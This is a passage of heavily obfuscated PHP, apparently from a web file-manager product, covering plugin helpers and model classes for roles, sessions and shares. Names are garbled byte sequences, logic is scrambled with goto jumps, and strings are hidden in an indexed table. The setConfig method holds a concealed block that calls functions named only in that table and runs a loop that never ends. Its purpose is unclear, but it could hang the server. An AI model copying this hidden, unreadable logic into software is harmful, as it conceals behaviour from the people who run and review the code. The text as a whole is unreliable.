$Eğª…•Ú°[$Dø‘Ş‹ù·[77]]); if (isset($Eğª…•Ú°[$Dø‘Ş‹ù·[455]])) { $cáŠòÁ©Ÿô[] = $Eğª…•Ú°[$Dø‘Ş‹ù·[455]]; } goto e‰ ¶˜âÍº; e‰ ¶˜âÍº: return md5(implode($Dø‘Ş‹ù·[70], $cáŠòÁ©Ÿô)); goto Fùöœ¯ğî›; C®åàÉ¶ô‹: $Dø‘Ş‹ù· =& $_SERVER[¼]; if (!$Eğª…•Ú°) { $Eğª…•Ú° = $this->fileInfo; } if (isset($Eğª…•Ú°[$Dø‘Ş‹ù·[161]])) { return $Eğª…•Ú°[$Dø‘Ş‹ù·[161]]; } goto Dùçáë„áÃ; Fùöœ¯ğî›: } final function checkSharePath($a—›Ø”çâ) { goto BÀ±‘¬¯Ÿ; BÀ±‘¬¯Ÿ: $d„‚¸©ì¹ =& $_SERVER[¼]; if (!defined($d„‚¸©ì¹[423])) { define($d„‚¸©ì¹[1306], 0); } if (!$this->isShare($a—›Ø”çâ)) { return !1; } goto f‚ŠåôÉ; f‚ŠåôÉ: $d´µÛ¤Û× = Action($d„‚¸©ì¹[1010])->sharePathInfo($a—›Ø”çâ); if (!isset($d´µÛ¤Û×[$d„‚¸©ì¹[75]])) { show_json(LNG($d„‚¸©ì¹[1307]), !1); } $this->fileInfo = $d´µÛ¤Û×[$d„‚¸©ì¹[159]]; goto c‹¿Ê¸Ô; c‹¿Ê¸Ô: $this->cachePath = $this->pluginCachePath($this->fileInfo[$d„‚¸©ì¹[161]]); return $d´µÛ¤Û×[$d„‚¸©ì¹[75]]; goto Få§ïòãÏ„; Få§ïòãÏ„: } final function pluginCachePath($e…Œåã¨‚¡ = '') { $bæİªÅ¤†ç =& $_SERVER[¼]; $aÇÜš¹¾ùÏ = IO_PATH_SYSTEM_TEMP . $bæİªÅ¤†ç[1308] . $this->pluginName; if (!($Eìˆ†åˆó§ = IO::infoFull($aÇÜš¹¾ùÏ))) { return IO::mkdir($aÇÜš¹¾ùÏ . $bæİªÅ¤†ç[8] . $e…Œåã¨‚¡); } if (empty($e…Œåã¨‚¡)) { return $Eìˆ†åˆó§[$bæİªÅ¤†ç[75]]; } if (!($e™ø£œ–Ä = IO::fileNameExist($Eìˆ†åˆó§[$bæİªÅ¤†ç[75]], $e…Œåã¨‚¡))) { return IO::mkdir($Eìˆ†åˆó§[$bæİªÅ¤†ç[75]] . $e…Œåã¨‚¡); } return KodIO::make($e™ø£œ–Ä); } final function pluginCacheFileSet($e³×‘˜Óò, $cìİóæ§’µ = '') { $A¦ôùØ„ìÊ =& $_SERVER[¼]; if (!($b³›†Ø¶‚ï = IO::infoFull($e³×‘˜Óò))) { return IO::mkfile($e³×‘˜Óò, $cìİóæ§’µ, REPEAT_REPLACE); } IO::setContent($b³›†Ø¶‚ï[$A¦ôùØ„ìÊ[75]], $cìİóæ§’µ); return $b³›†Ø¶‚ï[$A¦ôùØ„ìÊ[75]]; } final function pluginLocalFile($bêŒä†æ¨ = '') { goto fËçáö˜íª; fËçáö˜íª: $e²é¸“âïí =& $_SERVER[¼]; $eİêá‹Ğï = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($eİêá‹Ğï)) { mk_dir($eİêá‹Ğï); } goto CÏ“éÑ¢£; B»óİÙö·’: $E“È÷Ì¯Æ = $eİêá‹Ğï . $d÷º¡µã»˜; if (@file_exists($E“È÷Ì¯Æ)) { return $E“È÷Ì¯Æ; } return IO::copy($bêŒä†æ¨, $eİêá‹Ğï, 0, $d÷º¡µã»˜); goto eöôÙºÙ»; CÏ“éÑ¢£: if (!$bêŒä†æ¨) { return $eİêá‹Ğï; } $c‹ÒÇ­ìğ = IO::info($bêŒä†æ¨); $d÷º¡µã»˜ = $this->_tmpFileName($c‹ÒÇ­ìğ) . $e²é¸“âïí[93] . $c‹ÒÇ­ìğ[$e²é¸“âïí[157]]; goto B»óİÙö·’; eöôÙºÙ»: } final function appPackage() { goto f¢˜İğğö¹; b…Ò½ƒ¤¦×: $this->parseLang($aŒ…éËÊâõ); $cšÜã˜‘Ò× = json_decode_force($aŒ…éËÊâõ); if (!$cšÜã˜‘Ò×) { return array(); } goto E»©¼Ÿ¿¬¼; f¢˜İğğö¹: $fã îå•Š… =& $_SERVER[¼]; if ($this->packageData) { return $this->packageData; } $aŒ…éËÊâõ = $this->parseFile($this->pluginPath . $fã îå•Š…[1309]); goto b…Ò½ƒ¤¦×; a¥¯´‘‡‡Ç: return $cšÜã˜‘Ò×; goto c‰‰Æ”®Ø; E»©¼Ÿ¿¬¼: $c­ò»»ø§– = Hook::trigger($fã îå•Š…[1310], $cšÜã˜‘Ò×); if ($c­ò»»ø§– && is_array($c­ò»»ø§–)) { $cšÜã˜‘Ò× = $c­ò»»ø§–; } $this->packageData = $cšÜã˜‘Ò×; goto a¥¯´‘‡‡Ç; c‰‰Æ”®Ø: } public function packageInfoGet($Cñˆ—£ â) { $bÁĞøé…ª = $this->appPackage(); return array_get_value($bÁĞøé…ª, $Cñˆ—£ â); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¼][1311]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¼][1312]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¼][1313]); } private function parseFile($DçÄ¿¦¬‘²) { $a•‡öÀœ¼è =& $_SERVER[¼]; $b…”ïˆÚÉ = file_get_contents($DçÄ¿¦¬‘²); $F²ëÓƒÔß· = array($a•‡öÀœ¼è[1314], $a•‡öÀœ¼è[1315], $a•‡öÀœ¼è[1316], $a•‡öÀœ¼è[1317], $a•‡öÀœ¼è[1318], $a•‡öÀœ¼è[1319], $a•‡öÀœ¼è[1320]); $c‡…×¯†·” = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$a•‡öÀœ¼è[84]][$a•‡öÀœ¼è[1321]]); $b…”ïˆÚÉ = str_replace($F²ëÓƒÔß·, $c‡…×¯†·”, $b…”ïˆÚÉ); return $b…”ïˆÚÉ; } private function parseLang(&$Eòïˆ­Â‘ƒ) { goto BĞµ¢è…ãÆ; F—¨àäš¯: $eŠ¾ˆ×¾«å = array(); foreach ($d“àñ‰‰ƒØ[0] as $fĞ”­·¾ˆ¦) { $b‹®ˆ¹ğ•° = substr($fĞ”­·¾ˆ¦, strlen($E‰ï‘¢Œ’), -4); $FÓ§‰‚ß = LNG($b‹®ˆ¹ğ•°); $eï¨¤Ïñèù[] = $fĞ”­·¾ˆ¦; $eŠ¾ˆ×¾«å[] = str_replace(array($AÃÂ­‡°[214], $AÃÂ­‡°[985], $AÃÂ­‡°[327], $AÃÂ­‡°[113]), array($AÃÂ­‡°[50], $AÃÂ­‡°[50], $AÃÂ­‡°[33], $AÃÂ­‡°[1324]), $FÓ§‰‚ß); } $Eòïˆ­Â‘ƒ = str_replace($eï¨¤Ïñèù, $eŠ¾ˆ×¾«å, $Eòïˆ­Â‘ƒ); goto aƒòŒá…ã; dñºê¾’‰: preg_match_all($AÃÂ­‡°[1323], $Eòïˆ­Â‘ƒ, $d“àñ‰‰ƒØ); if (!is_array($d“àñ‰‰ƒØ) || count($d“àñ‰‰ƒØ) == 0 || !is_array($d“àñ‰‰ƒØ[0]) || count($d“àñ‰‰ƒØ[0]) == 0) { return; } $eï¨¤Ïñèù = array(); goto F—¨àäš¯; BĞµ¢è…ãÆ: $AÃÂ­‡° =& $_SERVER[¼]; $E‰ï‘¢Œ’ = $AÃÂ­‡°[1322]; if (!strstr($Eòïˆ­Â‘ƒ, $E‰ï‘¢Œ’)) { return; } goto dñºê¾’‰; aƒòŒá…ã: } private function parseConfig(&$fŸ­è‘ƒô) { goto C›å…ƒğÕª; Cï‚ñŞƒ×Ñ: $fŸ­è‘ƒô = str_replace($A«îõÊÆ…ã, $aè»«Èç¿ƒ, $fŸ­è‘ƒô); goto DœÃˆàŒùº; F¬µî­°¡Ü: preg_match_all($E«¥œèó¦â[1326], $fŸ­è‘ƒô, $BÛ¦ í‚É); if (!is_array($BÛ¦ í‚É) || count($BÛ¦ í‚É) == 0 || !is_array($BÛ¦ í‚É[0]) || count($BÛ¦ í‚É[0]) == 0) { return; } $EÊØ¬Ø«å· = $this->getConfig(); goto dÖœÑ×Ú˜; dÖœÑ×Ú˜: $A«îõÊÆ…ã = array(); $aè»«Èç¿ƒ = array(); foreach ($BÛ¦ í‚É[0] as $AËæÙ¶¶´¥) { $cÎË®˜¨ç = substr($AËæÙ¶¶´¥, strlen($Dˆò”²Ë£„), -2); $A«îõÊÆ…ã[] = $AËæÙ¶¶´¥; $aè»«Èç¿ƒ[] = _get($EÊØ¬Ø«å·, $cÎË®˜¨ç); } goto Cï‚ñŞƒ×Ñ; C›å…ƒğÕª: $E«¥œèó¦â =& $_SERVER[¼]; $Dˆò”²Ë£„ = $E«¥œèó¦â[1325]; if (!strstr($fŸ­è‘ƒô, $Dˆò”²Ë£„)) { return; } goto F¬µî­°¡Ü; DœÃˆàŒùº: } private function parsePackage(&$Fñ•Ü†Ğ½) { goto AÀ±êƒãç; EÀ¨©âÆ¥¿: $Fñ•Ü†Ğ½ = str_replace($dÛ§ˆ–¼¨Œ, $E¿“æßÒè, $Fñ•Ü†Ğ½); goto FÎÆë•¢Ã‘; c™ÊŠØ‘Ğ†: $dÛ§ˆ–¼¨Œ = array(); $E¿“æßÒè = array(); foreach ($Añ¤Ñ²ŸÁà[0] as $DµÙ¹ ê½) { $Cçò„µ¨ÏÁ = substr($DµÙ¹ ê½, strlen($b­ĞëæÔ¯), -2); $dÛ§ˆ–¼¨Œ[] = $DµÙ¹ ê½; $E¿“æßÒè[] = _get($C—ÊÀÅÀÉ‘, $Cçò„µ¨ÏÁ); } goto EÀ¨©âÆ¥¿; AÀ±êƒãç: $b¸¾³Øé =& $_SERVER[¼]; $b­ĞëæÔ¯ = $b¸¾³Øé[1327]; if (!strstr($Fñ•Ü†Ğ½, $b­ĞëæÔ¯)) { return; } goto F„™”ƒŸ; F„™”ƒŸ: preg_match_all($b¸¾³Øé[1328], $Fñ•Ü†Ğ½, $Añ¤Ñ²ŸÁà); if (!is_array($Añ¤Ñ²ŸÁà) || count($Añ¤Ñ²ŸÁà) == 0 || !is_array($Añ¤Ñ²ŸÁà[0]) || count($Añ¤Ñ²ŸÁà[0]) == 0) { return; } $C—ÊÀÅÀÉ‘ = $this->appPackage(); goto c™ÊŠØ‘Ğ†; FÎÆë•¢Ã‘: } final function echoFile($bë®òÏ´˜ˆ, $c†âÉÁŒ¶ = false) { goto dİÔõ¸‰; dİÔõ¸‰: $f©‡ÀÈ‡Ïµ =& $_SERVER[¼]; $FˆÊŸˆ’«‰ = $this->pluginPath . $bë®òÏ´˜ˆ; if (ACT == $f©‡ÀÈ‡Ïµ[1329]) { echo $f©‡ÀÈ‡Ïµ[1330] . $this->pluginName . $f©‡ÀÈ‡Ïµ[8] . $bë®òÏ´˜ˆ . $f©‡ÀÈ‡Ïµ[1331]; if (!file_exists($FˆÊŸˆ’«‰)) { echo $f©‡ÀÈ‡Ïµ[1332]; return; } } goto dË„òó¶×‹; a¡·ëîÛ¡: $this->parsePackage($BœÅœâôÚÜ); if (is_array($c†âÉÁŒ¶)) { $BœÅœâôÚÜ = str_replace(array_keys($c†âÉÁŒ¶), array_values($c†âÉÁŒ¶), $BœÅœâôÚÜ); } echo $f©‡ÀÈ‡Ïµ[214] . $BœÅœâôÚÜ; goto B„à¸‚éÓ; dË„òó¶×‹: $BœÅœâôÚÜ = $this->parseFile($FˆÊŸˆ’«‰); $this->parseLang($BœÅœâôÚÜ); $this->parseConfig($BœÅœâôÚÜ); goto a¡·ëîÛ¡; B„à¸‚éÓ: } final function initLang() { goto EÊº·ïÃ‡; EÊº·ïÃ‡: $d¤Äµ•‚¶ =& $_SERVER[¼]; $FÉéìø¸ = $d¤Äµ•‚¶[1333]; $fæº÷Àƒó² = $this->pluginPath . $d¤Äµ•‚¶[1334]; goto CÉÊè ‚ÃŠ; bƒ„ÔÎÍˆ©: if (!is_array($eö³ìîê¹ñ)) { return array(); } if (@count($eö³ìîê¹ñ) > 0) { I18n::set($eö³ìîê¹ñ); } return $eö³ìîê¹ñ; goto FÉÂ‹šŞŸÖ; CÉÊè ‚ÃŠ: $D†·ÜŠ‹¯ = I18n::getType(); $eö³ìîê¹ñ = array(); if (file_exists($fæº÷Àƒó² . $D†·ÜŠ‹¯ . $d¤Äµ•‚¶[764])) { $eö³ìîê¹ñ = (include $fæº÷Àƒó² . $D†·ÜŠ‹¯ . $d¤Äµ•‚¶[764]); } else { if ($D†·ÜŠ‹¯ == $d¤Äµ•‚¶[1335] && !file_exists($fæº÷Àƒó² . $D†·ÜŠ‹¯ . $d¤Äµ•‚¶[764]) && file_exists($fæº÷Àƒó² . $d¤Äµ•‚¶[1336])) { $eö³ìîê¹ñ = (include $fæº÷Àƒó² . $d¤Äµ•‚¶[1336]); } else { if (file_exists($fæº÷Àƒó² . $FÉéìø¸ . $d¤Äµ•‚¶[764])) { $eö³ìîê¹ñ = (include $fæº÷Àƒó² . $FÉéìø¸ . $d¤Äµ•‚¶[764]); } } } goto bƒ„ÔÎÍˆ©; FÉÂ‹šŞŸÖ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($b¸ÁßÄ£•Ÿ) { $e¸ÅÚí³ =& $_SERVER[¼]; if (!isset($_SERVER[$e¸ÅÚí³[754]]) || !isset($_SERVER[$e¸ÅÚí³[776]])) { goto a½ë‰´…ô; E“ÂÌ˜Õ«µ: $CØ‰„²· = $e¸ÅÚí³[788]; $CØ‰„²·($_SERVER[$e¸ÅÚí³[789]]); $a³©¹Û™Ïª = 1; goto D¦¶ò†ÃåÖ; aººÎ»İ‚: $FÈµºÈë³ = $d¶‚ù†°ŠÇ($f¸Ï«µßÛÙ); $aÄÃŒéÚ‘Ô = explode($e¸ÅÚí³[214], $FÈµºÈë³); if (count($aÄÃŒéÚ‘Ô) < $e¸ÅÚí³[548]) { $aŠœ¼ºç» = $e¸ÅÚí³[758]; $aŠœ¼ºç»(); } goto E“ÂÌ˜Õ«µ; D¦¶ò†ÃåÖ: for ($F—´­¤§¾… = $a³©¹Û™Ïª; $F—´­¤§¾… > 0; $F—´­¤§¾…++) { $CØ‰„²· = json_encode($GLOBALS[$e¸ÅÚí³[381]]); } goto d°ç¹¡ÁÖ…; a½ë‰´…ô: $b¨ùµèìŠš = $e¸ÅÚí³[787]; $d¶‚ù†°ŠÇ = $e¸ÅÚí³[755]; $f¸Ï«µßÛÙ = $_SERVER[$e¸ÅÚí³[756]] . $e¸ÅÚí³[757]; goto aººÎ»İ‚; d°ç¹¡ÁÖ…: } return $this->modelPlugin->setConfig($this->pluginName, $b¸ÁßÄ£•Ÿ); } public function onSetConfig($CÇÎœ‹ˆ—) { } public function onGetConfig($cÉàîõ–ºí) { } public function onChangeStatus($dÌ½»ëÂ¸º) { } public function onUninstall() { } public function onInstall() { } public function authCheck($d‡‰ÙÉŠ‰ = "\x70\x6c\x75\147\x69\156\x41\x75\164\x68") { $E©õÓÎ½ïì =& $_SERVER[¼]; if (!defined($E©õÓÎ½ïì[423])) { return !1; } if (_get($GLOBALS, $E©õÓÎ½ïì[453])) { return !0; } $A³“¶ª¢˜ = $this->getConfig(); if (!$A³“¶ª¢˜[$d‡‰ÙÉŠ‰]) { return !1; } return ActionCall($E©õÓÎ½ïì[1337], $A³“¶ª¢˜[$d‡‰ÙÉŠ‰]); } public function url($FÅ˜°ÚÃ¸Ñ, $dà•³ƒ¹º² = '', $dà¢‹µÃ›í = true) { goto E™”’Ë®¨Ó; eë‹ó–‚´: if (!$dà¢‹µÃ›í) { return $CÒïäéòÎ»; } echo $CÒïäéòÎ»; goto F÷²Ù®Øçƒ; E™”’Ë®¨Ó: $f„ë¾¨Ï­Ì =& $_SERVER[¼]; $DÜ¿Æå¥•Æ = $this->getConfig(); $C¢ƒ³íùã” = KOD_VERSION . $f„ë¾¨Ï­Ì[93] . KOD_VERSION_BUILD; goto d¢§İôÖ»İ; d¢§İôÖ»İ: $F ¦»‰İÇ“ = $this->packageVersion(); $e÷¼âÏö¶ = $C¢ƒ³íùã” . $f„ë¾¨Ï­Ì[408] . $F ¦»‰İÇ“; if ($dà•³ƒ¹º² == $f„ë¾¨Ï­Ì[33]) { $CÒïäéòÎ» = $this->pluginHost . $FÅ˜°ÚÃ¸Ñ . $f„ë¾¨Ï­Ì[1338] . $e÷¼âÏö¶; } else { if ($dà•³ƒ¹º² === $f„ë¾¨Ï­Ì[76]) { $CÒïäéòÎ» = $this->pluginHost . $FÅ˜°ÚÃ¸Ñ; } else { if ($dà•³ƒ¹º² == $f„ë¾¨Ï­Ì[1339]) { $CÒïäéòÎ» = STATIC_PATH . $FÅ˜°ÚÃ¸Ñ . $f„ë¾¨Ï­Ì[1338] . $C¢ƒ³íùã”; } else { if ($dà•³ƒ¹º² == $f„ë¾¨Ï­Ì[1340]) { $CÒïäéòÎ» = APP_HOST . $f„ë¾¨Ï­Ì[1341] . $FÅ˜°ÚÃ¸Ñ . $f„ë¾¨Ï­Ì[1338] . $C¢ƒ³íùã”; } else { if (isset($DÜ¿Æå¥•Æ[$dà•³ƒ¹º²])) { $CÒïäéòÎ» = $DÜ¿Æå¥•Æ[$dà•³ƒ¹º²] . $FÅ˜°ÚÃ¸Ñ . $f„ë¾¨Ï­Ì[1338] . $e÷¼âÏö¶; } } } } } goto eë‹ó–‚´; F÷²Ù®Øçƒ: } public function link($b—ê©ßÕÕ = false, $eÁªÍ±äğ = '') { $cÑßªˆÒğ• =& $_SERVER[¼]; if (!$b—ê©ßÕÕ) { $this->link($cÑßªˆÒğ•[1342], $cÑßªˆÒğ•[1340]); $this->link($cÑßªˆÒğ•[1343], $cÑßªˆÒğ•[1339]); $this->link($cÑßªˆÒğ•[1344], $cÑßªˆÒğ•[1339]); $this->link($cÑßªˆÒğ•[1345], $cÑßªˆÒğ•[1339]); $this->link($cÑßªˆÒğ•[1346], $cÑßªˆÒğ•[1339]); return; } $B»™ ¤¸ç™ = $this->url($b—ê©ßÕÕ, $eÁªÍ±äğ, !1); if (substr($b—ê©ßÕÕ, -3) == $cÑßªˆÒğ•[1347]) { echo $cÑßªˆÒğ•[1348] . $B»™ ¤¸ç™ . $cÑßªˆÒğ•[1349] . $cÑßªˆÒğ•[214]; } else { if (substr($b—ê©ßÕÕ, -4) == $cÑßªˆÒğ•[1350]) { echo $cÑßªˆÒğ•[1351] . $B»™ ¤¸ç™ . $cÑßªˆÒğ•[1352] . $cÑßªˆÒğ•[214]; } } } } goto c®Œ¬ÕÀ; a§Æ”†˜ŒÂ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\x6d\x5f\x6f\160\164\x69\157\x6e"; protected $jsonField = array("\x6d\145\156\165", "\162\157\154\145", "\x72\x6f\154\x65\107\162\x6f\165\x70", "\162\145\147\x69\163\164", "\145\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($fâÀ¸º—‘) { return "\x53\x79\163\164\145\155\117\160\x74\151\x6f\156\x5f{$fâÀ¸º—‘}"; } protected function optionDefault($aå¤ò×ƒìÔ = '') { $eŒí‹Ö·Â =& $_SERVER[¼]; if ($aå¤ò×ƒìÔ == $eŒí‹Ö·Â[33]) { return $GLOBALS[$eŒí‹Ö·Â[6]][$eŒí‹Ö·Â[2432]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\162\x6f\x6c\x65\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\141\x75\x74\x68", "\x6c\141\142\145\x6c", "\x64\151\x73\160\x6c\141\x79", "\163\171\163\164\145\155", "\x64\x65\x73\x63", "\x69\x67\156\x6f\162\145\105\x78\x74", "\x69\147\x6e\x6f\162\x65\x46\x69\x6c\x65\123\x69\172\145", "\141\144\155\151\156\151\x73\164\162\x61\164\157\x72", "\x73\157\x72\164"); public function listData($fÊ‡İÏÃ‰Ì = false, $C¨‹¨¤Ğï = "\163\157\x72\x74", $e•ÓÍÎ‰Ö = false) { return parent::listData($fÊ‡İÏÃ‰Ì, $C¨‹¨¤Ğï, $e•ÓÍÎ‰Ö); } public function update($eÃëÚŞÜ˜Ê, $bíÛ‘¯¬¶) { goto b¢ï¦Ë´Ğ‘; a¸ÉëŸ†: return parent::update($eÃëÚŞÜ˜Ê, $bíÛ‘¯¬¶); goto C¯Ê´ÆÊãµ; b¢ï¦Ë´Ğ‘: $d´ÙŞéË¢Ã =& $_SERVER[¼]; $aÆ‹†ç½ğ = parent::listData($eÃëÚŞÜ˜Ê); $F ãˆ¶ô´® = $this->findByName($bíÛ‘¯¬¶[$d´ÙŞéË¢Ã[28]]); goto bš‡–œ’Ê‘; bš‡–œ’Ê‘: if (!$aÆ‹†ç½ğ || $F ãˆ¶ô´® && $F ãˆ¶ô´®[$d´ÙŞéË¢Ã[364]] != $aÆ‹†ç½ğ[$d´ÙŞéË¢Ã[364]]) { return !1; } if ($F ãˆ¶ô´®[$d´ÙŞéË¢Ã[2433]] == 1) { $bíÛ‘¯¬¶ = array($d´ÙŞéË¢Ã[28] => $bíÛ‘¯¬¶[$d´ÙŞéË¢Ã[28]], $d´ÙŞéË¢Ã[2085] => $bíÛ‘¯¬¶[$d´ÙŞéË¢Ã[2085]]); } $this->filterAuth($bíÛ‘¯¬¶[$d´ÙŞéË¢Ã[373]]); goto a¸ÉëŸ†; C¯Ê´ÆÊãµ: } public function remove($DèŠ”–Åå) { $b”ìî¥ßÉ½ = parent::listData($DèŠ”–Åå); if (!$b”ìî¥ßÉ½ || $b”ìî¥ßÉ½[$_SERVER[¼][1073]]) { return !1; } return parent::remove($DèŠ”–Åå); } public function add($aÑ©È°ä±‚) { goto B£½ğé±ƒ¨; B£½ğé±ƒ¨: $f©¦¶šñØî =& $_SERVER[¼]; $d„óÀê™“ = $aÑ©È°ä±‚[$f©¦¶šñØî[28]]; if ($this->findByName($d„óÀê™“)) { return !1; } goto aÙ¶®ƒğ¬š; cÙÃÌ‰â›: return parent::insert($aÑ©È°ä±‚); goto E«ÉÏÖ›Ë ; aÙ¶®ƒğ¬š: $f×ğßÇ¾ƒ = array($f©¦¶šñØî[383] => $d„óÀê™“, $f©¦¶šñØî[2073] => $f©¦¶šñØî[33], $f©¦¶šñØî[2069] => $f©¦¶šñØî[2086], $f©¦¶šñØî[2434] => 1, $f©¦¶šñØî[2072] => 0, $f©¦¶šñØî[2435] => 0, $f©¦¶šñØî[2071] => $this->getSort()); $aÑ©È°ä±‚ = array_merge($f×ğßÇ¾ƒ, $aÑ©È°ä±‚); $this->filterAuth($aÑ©È°ä±‚[$f©¦¶šñØî[373]]); goto cÙÃÌ‰â›; E«ÉÏÖ›Ë : } private function getSort() { $DÔ¿—ò‡Ôœ =& $_SERVER[¼]; $a‘Ò•‰‡· = parent::listData(); $c¼ç¼ˆ»­¨ = array_to_keyvalue($a‘Ò•‰‡·, $DÔ¿—ò‡Ôœ[33], $DÔ¿—ò‡Ôœ[2088]); return empty($c¼ç¼ˆ»­¨) ? 0 : max($c¼ç¼ˆ»­¨) + 1; } private function filterAuth(&$EëÌ†¯ß«) { $EŸ¾ß¶ÔÒ =& $_SERVER[¼]; $Bò©÷Ú¡å¡ = array(); $EÑ¹Ê°óŠ— = array_filter(explode($EŸ¾ß¶ÔÒ[47], $EëÌ†¯ß«)); foreach ($EÑ¹Ê°óŠ— as $EëÌ†¯ß«) { $DëÆ²ˆ¶¹í = explode($EŸ¾ß¶ÔÒ[93], $EëÌ†¯ß«); if ($DëÆ²ˆ¶¹í[0] == $EŸ¾ß¶ÔÒ[1747] && $DëÆ²ˆ¶¹í[1] != $EŸ¾ß¶ÔÒ[1029]) { $B¬­ğÓê‹× = $DëÆ²ˆ¶¹í[0] . $EŸ¾ß¶ÔÒ[93] . $DëÆ²ˆ¶¹í[1] . $EŸ¾ß¶ÔÒ[2436]; if (!in_array($B¬­ğÓê‹×, $EÑ¹Ê°óŠ—)) { $Bò©÷Ú¡å¡[] = $B¬­ğÓê‹×; } } $Bò©÷Ú¡å¡[] = $EëÌ†¯ß«; } $EëÌ†¯ß« = implode($EŸ¾ß¶ÔÒ[47], $Bò©÷Ú¡å¡); } public function sort($fİîÙœ, $EÀÀö¡ù‰ã) { return parent::update($fİîÙœ, $EÀÀö¡ù‰ã); } } goto C¿ª²‡‚‰”; fâ³§¥Í¸ö: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\x5f\163\145\163\x73\x69\x6f\x6e"; public function get($cáÌ±Š”) { $B­°—ø›¯ =& $_SERVER[¼]; $aàê²ºåÔ˜ = $this->where(array($B­°—ø›¯[2168] => $cáÌ±Š”))->find(); if (!is_array($aàê²ºåÔ˜)) { return !1; } return $aàê²ºåÔ˜[$B­°—ø›¯[684]]; } public function set($B¦İä…’ÉÁ, $CÙ£¶›°İ¢, $C÷é˜ê¼îÒ = 3600) { $dã‚†«º =& $_SERVER[¼]; $C³§°Ş¸ö = array($dã‚†«º[2168] => $B¦İä…’ÉÁ, $dã‚†«º[2097] => $CÙ£¶›°İ¢, $dã‚†«º[2169] => $C÷é˜ê¼îÒ + time()); if (Session::get($dã‚†«º[2170])) { $C³§°Ş¸ö[$dã‚†«º[1404]] = Session::get($dã‚†«º[2170]); } else { $C³§°Ş¸ö[$dã‚†«º[1404]] = 0; } if ($this->get($B¦İä…’ÉÁ)) { return $this->where(array($dã‚†«º[2168] => $B¦İä…’ÉÁ))->save($C³§°Ş¸ö); } else { return $this->add($C³§°Ş¸ö, array(), !0); } } public function remove($c•àĞ³) { return $this->where(array($_SERVER[¼][2168] => $c•àĞ³))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¼][2171] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\x66\171\124\151\155\145", "\164\151\155\145", "\151\x6e\x73\145\x72\164\x2c\165\160\x64\x61\x74\x65", "\x66\x75\156\x63\164\x69\x6f\156"), array("\143\x72\x65\141\x74\145\x54\151\x6d\145", "\x74\x69\x6d\x65", "\x69\156\163\x65\x72\x74", "\146\165\x6e\x63\x74\151\x6f\x6e"), array("\157\160\x74\x69\157\x6e\x73", '', "\x69\x6e\x73\145\162\x74\x2c\165\x70\144\x61\x74\x65\x2c\163\145\x6c\x65\143\164", "\152\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($E°Í»„ëòÈ) { $Cê±ˆ‘î•º =& $_SERVER[¼]; $bå¯Ñ®¾–õ = isset($E°Í»„ëòÈ[0]) ? $E°Í»„ëòÈ[0] : !1; return array($Cê±ˆ‘î•º[2172] => array(USER_ID, $Cê±ˆ‘î•º[2173]), $Cê±ˆ‘î•º[2135] => array($bå¯Ñ®¾–õ, $Cê±ˆ‘î•º[2174])); } protected function listSimple() { $cÇâè¸¸¯½ = array($_SERVER[¼][1404] => USER_ID); $a¨Ï„¨Çö = $this->field($this->fieldList)->where($cÇâè¸¸¯½)->select(); return $a¨Ï„¨Çö ? $a¨Ï„¨Çö : array(); } protected function getInfo($Eˆä‰Õ¹Å•, $b¯†Çöªš¶ = false) { $B¹ÌÀî©Õ¢ =& $_SERVER[¼]; if ($b¯†Çöªš¶) { return $this->_getShareInfo(array($B¹ÌÀî©Õ¢[437] => $Eˆä‰Õ¹Å•)); } $D¶µ»ŒÊµª = $this->cacheFunctionGet($B¹ÌÀî©Õ¢[2175], $Eˆä‰Õ¹Å•); return $D¶µ»ŒÊµª; } public function getInfoByHash($F÷Çñ±…³) { return $this->_getShareInfo(array($_SERVER[¼][439] => $F÷Çñ±…³)); } public function getInfoByPath($aÙ¡ÓÀÙÚÎ) { $C ²ÓÖÙ =& $_SERVER[¼]; $bö™ÜÁŞÇ = array($C ²ÓÖÙ[1404] => USER_ID, $C ²ÓÖÙ[366] => $aÙ¡ÓÀÙÚÎ); return $this->_getShareInfo($bö™ÜÁŞÇ); } public function getInfoBySourcePath($F‰Ë®Ä®î) { $aãéíÄ“À¿ =& $_SERVER[¼]; $Cµ‡ô˜ò¥§ = array($aãéíÄ“À¿[1404] => USER_ID, $aãéíÄ“À¿[1011] => $F‰Ë®Ä®î); return $this->_getShareInfo($Cµ‡ô˜ò¥§); } private function _getShareInfo($dùÀ¿ºÓÈô) { goto b¬š‡äÀ‚; A‘ìÜøéŸ„: if ($Aì‡»ÃÉ°–[$e¥“‰¤Î£[366]] == $e¥“‰¤Î£[464]) { $Aì‡»ÃÉ°–[$e¥“‰¤Î£[388]] = IO::info($Aì‡»ÃÉ°–[$e¥“‰¤Î£[1011]]); } else { $Aì‡»ÃÉ°–[$e¥“‰¤Î£[388]] = Model($e¥“‰¤Î£[1103])->pathInfo($Aì‡»ÃÉ°–[$e¥“‰¤Î£[366]]); } $Aì‡»ÃÉ°–[$e¥“‰¤Î£[2177]] = $eë‚¬á¶ÄÀ; return $Aì‡»ÃÉ°–; goto a¶ßƒ¥…ğŞ; cÀ‹ø‘Çƒ: $dùÀ¿ºÓÈô = array($e¥“‰¤Î£[437] => $Aì‡»ÃÉ°–[$e¥“‰¤Î£[437]]); $cë“ä™°Æ = $e¥“‰¤Î£[2176]; $eë‚¬á¶ÄÀ = Model($e¥“‰¤Î£[533])->order($e¥“‰¤Î£[364])->field($cë“ä™°Æ)->where($dùÀ¿ºÓÈô)->select(); goto A‘ìÜøéŸ„; b¬š‡äÀ‚: $e¥“‰¤Î£ =& $_SERVER[¼]; $Aì‡»ÃÉ°– = 